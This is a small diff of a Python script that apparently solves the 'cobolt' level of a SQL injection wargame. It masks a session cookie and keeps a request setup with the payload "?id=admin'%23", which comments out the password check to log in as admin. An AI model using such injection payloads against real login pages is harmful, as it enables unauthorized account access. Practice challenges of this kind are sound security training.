@@ -8,7 +8,7 @@
 
 import requests
 
-header = {"Cookie": "PHPSESSID=vdnm7k113d0u7ignerl94hf2o5;"}
+header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
 url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"
 
 payload = "?id=admin'%23"
